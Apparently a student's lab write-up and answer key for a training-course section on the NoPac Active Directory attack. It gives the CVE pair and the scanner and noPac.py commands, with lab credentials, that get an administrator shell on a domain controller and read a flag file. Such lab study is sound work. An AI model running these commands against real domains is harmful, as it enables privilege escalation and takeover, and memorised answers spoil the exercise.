# [Bleeding Edge Vulnerabilities](Bleeding%20Edge%20Vulnerabilities.md)
### Which two CVEs indicate NoPac.py may work? (Format: ####-#####&####-#####, no spaces)

`2021-42278&2021-42287`
### Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop.

```shell
sudo python3 /opt/noPac/scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
![](Screenshot%202026-05-30%20at%2021.50.07.png)

```shell
sudo python3 /opt/noPac/noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
![](Screenshot%202026-05-30%20at%2021.50.46.png)

```cmd
type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
```
![](Screenshot%202026-05-30%20at%2021.52.26.png)
